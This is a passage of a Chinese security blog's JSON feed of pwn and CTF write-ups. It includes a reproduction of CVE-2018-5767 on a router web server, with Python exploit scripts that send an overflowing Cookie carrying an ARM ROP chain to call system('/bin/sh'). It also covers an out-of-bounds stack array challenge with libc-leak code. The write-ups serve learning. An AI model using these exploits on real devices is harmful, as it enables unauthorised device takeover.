class=\"comment\">#print(hex(leak_heap_addr))</span></span><br><span class=\"line\">vul_addr = leak_heap_addr + <span class=\"number\">0x20</span></span><br><span class=\"line\"></span><br><span class=\"line\">backdoor_addr = pie + <span class=\"number\">0x11c9</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;choice: &#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;content: &#x27;</span>)</span><br><span class=\"line\">p.send(p64(backdoor_addr - <span class=\"number\">0xdeadbeef</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">trigger_input = (vul_addr - pie - <span class=\"number\">0x5000</span>) // <span class=\"number\">8</span> + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;choice: &#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(trigger_input))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"待解决\"><a href=\"#待解决\" class=\"headerlink\" title=\"待解决\"></a>待解决</h1><p>这个题如果正向写代码,要怎么写呢?</p>\n<p>ida一开始进去不是main而是…这里是否…</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/",
            "url": "https://tangzichengcc.github.io/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/",
            "title": "CVE-2018-5767漏洞复现的关键问题",
            "date_published": "2023-05-25T01:29:15.000Z",
            "content_html": "<p>和恒哥进行的复现</p>\n<h1 id=\"arm架构的rop\"><a href=\"#arm架构的rop\" class=\"headerlink\" title=\"arm架构的rop\"></a>arm架构的rop</h1><p>​\t\t和x86的架构的区别还是挺大的,</p>\n<p><img src=\"/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/image-20230525095117672.png\" alt=\"image-20230525095117672\"></p>\n<p>1.pop {r4,r5,r6,fp,pc}会弹出5个值, 3个aaaa给前三个,然后r12-3给fp, wait+24,也就是pop {r3,pc}给pc</p>\n<p>2.执行pop {r3,pc}, 把puts传给  r3, 然后 mov r0,sp;blx r3给pc,</p>\n<p>3.mov r0,sp好像没啥用, blx r3跳转指令,它用于将程序控制权转移到寄存器 R3 中存储的地址处。BLX指令可以用于跳转到一个函数或者子程序的地址。 <font color=\"red\">所以就跳到了puts了!</font></p>\n<p><img src=\"/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/image-20230525095714223.png\" alt=\"image-20230525095714223\"></p>\n<p>栈传参数,此时栈顶是要puts的字符串,</p>\n<p><img src=\"/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/image-20230525095421987.png\" alt=\"image-20230525095421987\"></p>\n<p><img src=\"/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/image-20230525095441303.png\" alt=\"image-20230525095441303\"></p>\n<h2 id=\"python2版本exp\"><a href=\"#python2版本exp\" class=\"headerlink\" title=\"python2版本exp\"></a>python2版本exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">base = <span class=\"number\">0xff60acd4</span> - <span class=\"number\">0x035CD4</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.0&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts = base+libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">_<span class=\"built_in\">str</span> = <span class=\"string\">&quot;xxxxxx\\x00&quot;</span></span><br><span class=\"line\">mov_r0 = base+<span class=\"number\">0x00040cb8</span> <span class=\"comment\"># mov r0, sp; blx r3;</span></span><br><span class=\"line\">pop_r3 = base+<span class=\"number\">0x00018298</span> <span class=\"comment\"># pop &#123;r3, pc&#125;;</span></span><br><span class=\"line\">URL = <span class=\"string\">&quot;http://xxxxxx:80/goform/hello&quot;</span></span><br><span class=\"line\">pl = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">444</span>+<span class=\"string\">&quot;.png&quot;</span>+p32(pop_r3)+p32(puts)+p32(mov_r0)+_<span class=\"built_in\">str</span></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;Cookie&quot;</span>:<span class=\"string\">&quot;password=&quot;</span>+pl&#125;</span><br><span class=\"line\">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"python3版本exp\"><a href=\"#python3版本exp\" class=\"headerlink\" title=\"python3版本exp\"></a>python3版本exp</h2><p>​\t\tpython3和python2的转换一直出奇奇怪怪的问题,是编码的问题,如何过渡好呢?</p>\n<p><a href=\"https://blog.csdn.net/yongbaoii/article/details/108873780\">https://blog.csdn.net/yongbaoii/article/details/108873780</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">base = <span class=\"number\">0xff60acd4</span> - <span class=\"number\">0x035CD4</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.0&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts = base+libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">_<span class=\"built_in\">str</span> = <span class=\"string\">&quot;xxxxxx\\x00&quot;</span></span><br><span class=\"line\">mov_r0 = base+<span class=\"number\">0x00040cb8</span> <span class=\"comment\"># mov r0, sp; blx r3;</span></span><br><span class=\"line\">pop_r3 = base+<span class=\"number\">0x00018298</span> <span class=\"comment\"># pop &#123;r3, pc&#125;;</span></span><br><span class=\"line\">URL = <span class=\"string\">&quot;http://xxxxxx:80/goform/hello&quot;</span></span><br><span class=\"line\">pl = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">444</span>+<span class=\"string\">&quot;.png&quot;</span>+p32(pop_r3).decode(<span class=\"string\">&quot;iso-8859-1&quot;</span>) +p32(puts).decode(<span class=\"string\">&quot;iso-8859-1&quot;</span>) +p32(mov_r0).decode(<span class=\"string\">&quot;iso-8859-1&quot;</span>)+_<span class=\"built_in\">str</span></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;Cookie&quot;</span>:<span class=\"string\">&quot;password=&quot;</span>+pl&#125;</span><br><span class=\"line\">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>decode(“iso-8859-1”)  就可以了!</p>\n<h1 id=\"system-“-x2F-bin-x2F-sh”\"><a href=\"#system-“-x2F-bin-x2F-sh”\" class=\"headerlink\" title=\"system(“&#x2F;bin&#x2F;sh”)\"></a>system(“&#x2F;bin&#x2F;sh”)</h1><p>​\t\t看博主一直复现失败,打算试试qemu-system模式的..但是在自己服务器上就复现成功了…很玄学(计算机没有玄学!)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">base = <span class=\"number\">0xff60acd4</span> - <span class=\"number\">0x035CD4</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.0&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts = base+libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">system_addr = base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">_<span class=\"built_in\">str</span> = <span class=\"string\">&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\">mov_r0 = base+<span class=\"number\">0x00040cb8</span> <span class=\"comment\"># mov r0, sp; blx r3;</span></span><br><span class=\"line\">pop_r3 = base+<span class=\"number\">0x00018298</span> <span class=\"comment\"># pop &#123;r3, pc&#125;;</span></span><br><span class=\"line\">URL = <span class=\"string\">&quot;http://xxxxxxx:80/goform/hello&quot;</span></span><br><span class=\"line\">pl = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">444</span>+<span class=\"string\">&quot;.png&quot;</span>+p32(pop_r3)+p32(system_addr)+p32(mov_r0)+_<span class=\"built_in\">str</span></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;Cookie&quot;</span>:<span class=\"string\">&quot;password=&quot;</span>+pl&#125;</span><br><span class=\"line\">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"坑\"><a href=\"#坑\" class=\"headerlink\" title=\"坑\"></a>坑</h1><p>1.gdb-multiarch .&#x2F;bin&#x2F;httpd 要对应启动的文件,不能是它的备份等,这可能和gdb的工作原理有关</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.52pojie.cn/thread-1674625-1-1.html\">https://www.52pojie.cn/thread-1674625-1-1.html</a></p>\n<p>python共存问题</p>\n<p><a href=\"https://blog.csdn.net/Huang_8208_sibo/article/details/124762816\">https://blog.csdn.net/Huang_8208_sibo/article/details/124762816</a></p>\n<p><a href=\"https://blog.csdn.net/qq_38154820/article/details/122955197\">https://blog.csdn.net/qq_38154820/article/details/122955197</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/mRq3n3jDM0zvR15JAsLYSA\">https://mp.weixin.qq.com/s/mRq3n3jDM0zvR15JAsLYSA</a></p>\n",
            "tags": [
                "路由器"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/",
            "title": "pwn入门-27-5月乙队月赛三题",
            "date_published": "2023-05-22T03:39:48.000Z",
            "content_html": "<p>​\t\t这次月赛的pwn,出的偏简单,终于能做出题来了……..不过在做题的时候很多小点有点卡,所以平常要把这些知识点,细节都补充完整和练熟.</p>\n<p>​\t\t题目文件: 本链接+题目文件名</p>\n<h1 id=\"1-easy-leak\"><a href=\"#1-easy-leak\" class=\"headerlink\" title=\"1.easy_leak\"></a>1.easy_leak</h1><p>​\t\t本身题目不难,但是自己越做越复杂了..整体的思路还是有待加强.</p>\n<h2 id=\"题目分析\"><a href=\"#题目分析\" class=\"headerlink\" title=\"题目分析\"></a>题目分析</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __fastcall <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Hello, my beeeest friend!Also a small chal for you!Good luck!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. Read num&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2. Write num&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;0. Exit&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> choice; <span class=\"comment\">// [rsp+4h] [rbp-41Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+8h] [rbp-418h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> num_to_write; <span class=\"comment\">// [rsp+Ch] [rbp-414h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> nums[<span class=\"number\">256</span>]; <span class=\"comment\">// [rsp+10h] [rbp-410h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v8; <span class=\"comment\">// [rsp+418h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v8 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  init();</span><br><span class=\"line\">  menu();</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(nums, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(nums));</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)__isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, &amp;choice) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( choice == <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Idx:&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)__isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, &amp;idx) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The num: %u\\n&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)nums[idx]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( choice != <span class=\"number\">2</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Idx:&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)__isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, &amp;idx) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Num:&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)__isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, &amp;num_to_write) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      nums[idx] = num_to_write;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Byebye!&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t能够看到,它实现了读写栈上的一个数组的功能,但是没有设置边界,于是可以读写栈上的任意值,那可以直接修改返回地址,但是没有后门函数,(<font color=\"red\">于是自己就先用rop链写system(“&#x2F;bin&#x2F;sh”),失败后又用了orw…越做越麻烦,其实可以直接用one_gadget的!</font>)</p>\n<h2 id=\"寻找返回地址和gadget\"><a href=\"#寻找返回地址和gadget\" class=\"headerlink\" title=\"寻找返回地址和gadget\"></a>寻找返回地址和gadget</h2><p> int nums[256]; &#x2F;&#x2F; [rsp+10h] [rbp-410h] BYREF</p>\n<p>现在明白在ida里面这个注释是什么意思了…就是从rsp+0x10的位置开始读nums,或者rbp-0x410的位置,这俩等价</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-0000000000000410</span> nums            dd <span class=\"number\">256</span> dup(?)</span><br><span class=\"line\"><span class=\"number\">-0000000000000010</span>                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-000000000000000F</span>                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-000000000000000</span>E                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-000000000000000</span>D                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-000000000000000</span>C                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-000000000000000B</span>                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-000000000000000</span>A                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-0000000000000009</span>                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-0000000000000008</span> var_8           dq ?</span><br><span class=\"line\">+<span class=\"number\">0000000000000000</span>  s              db <span class=\"number\">8</span> dup(?)</span><br><span class=\"line\">+<span class=\"number\">0000000000000008</span>  r              db <span class=\"number\">8</span> dup(?)</span><br><span class=\"line\">+<span class=\"number\">0000000000000010</span></span><br><span class=\"line\">+<span class=\"number\">0000000000000010</span> ; end of <span class=\"built_in\">stack</span> variables</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tnum占了256个4字节的空间,总共0x400, 然后还有8字节不知道干啥的,剩下8字节是canary? 然后就是rbp和返回地址了</p>\n<p>开启了pie,下断点的时候先vmmap看一下基址,然后+ida里面的地址</p>\n<p>​\t\t调试试试一下,所以打印258 259是canry,(注意num从0开始计数),260 261是rbp  262 263是返回地址</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230522122710222.png\" alt=\"image-20230522122710222\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">262</span> <span class=\"number\">0xf7deb083</span></span><br><span class=\"line\"><span class=\"number\">263</span> <span class=\"number\">0x7fff</span>     返回地址, 同时也是lib_start_main+<span class=\"number\">243</span>地址,即可以算出glibc的地址</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">270</span> <span class=\"number\">0x55554942</span></span><br><span class=\"line\"><span class=\"number\">271</span> <span class=\"number\">0x5555</span>  main的地址</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t把rsp修改成&#x2F;bin&#x2F;sh,然后返回地址 pop rdi, 然后system,就行了把(错了错了! ,rop的基本流程都忘了,在rop的时候rsp已经到了最后的rbp那个位置了….改上面干啥…)</p>\n<h2 id=\"泄露基地址\"><a href=\"#泄露基地址\" class=\"headerlink\" title=\"泄露基地址\"></a>泄露基地址</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">262</span> <span class=\"number\">0xf7deb083</span></span><br><span class=\"line\"><span class=\"number\">263</span> <span class=\"number\">0x7fff</span>     返回地址, 同时也是lib_start_main+<span class=\"number\">243</span>地址,即可以算出glibc的地址</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t泄漏的地址和libc加载的地址相差是固定的,可以从ida里看,也可以调试的时候看一下,调试的时候,打印出来它的值,减去加载的地址,就得到了固定的偏移</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230522153504249.png\" alt=\"image-20230522153504249\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">readone(<span class=\"number\">262</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;The num: &quot;</span>)</span><br><span class=\"line\">addr1 = io.recv(<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">readone(<span class=\"number\">263</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;The num: &quot;</span>)</span><br><span class=\"line\">addr2 = io.recv(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(<span class=\"built_in\">int</span>(addr1)))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(<span class=\"built_in\">int</span>(addr2)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#libcbase = int(addr1) - 0x240b3</span></span><br><span class=\"line\"><span class=\"comment\">## 拼接</span></span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = <span class=\"built_in\">int</span>(addr2)*(<span class=\"number\">2</span>**<span class=\"number\">32</span>)+<span class=\"built_in\">int</span>(addr1) - <span class=\"number\">0x240b3</span></span><br><span class=\"line\">libcbase1 = <span class=\"built_in\">int</span>(addr2)*(<span class=\"number\">0b100000000000000000000000000000000</span>)+<span class=\"built_in\">int</span>(addr1) - <span class=\"number\">0x240b3</span></span><br><span class=\"line\">libcbase2 = (<span class=\"built_in\">int</span>(addr2)&lt;&lt;<span class=\"number\">32</span>) + <span class=\"built_in\">int</span>(addr1) - <span class=\"number\">0x240b3</span> <span class=\"comment\"># 注意&lt;&lt;优先级很低,加个括号</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\tio接收到的是byte流 比如b’3033882803’,并且一次是不能打印完全的,只是4字节,要两次的拼起来</p>\n<p>​\t\tint(add2)*(2**32) 这样,或者左移32位才对,当时做题的时候好像是直接乘了100000…. 内存爆了还是溢出,报错了,应该是二进制的1000(32个0)</p>\n<p>​\t\t</p>\n<h2 id=\"封装函数-实现快速数据操作\"><a href=\"#封装函数-实现快速数据操作\" class=\"headerlink\" title=\"封装函数,实现快速数据操作\"></a>封装函数,实现快速数据操作</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read1</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">    low_addr=<span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">10</span>) <span class=\"comment\"># 这样就可以接收到全部了,不用考虑长度,到\\n截止,10进制接收</span></span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index+<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">    high_addr=<span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> high_addr*(<span class=\"number\">2</span>**<span class=\"number\">32</span>)+low_addr</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase3 = read1(<span class=\"number\">262</span>) - <span class=\"number\">0x240b3</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libcbase3))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span 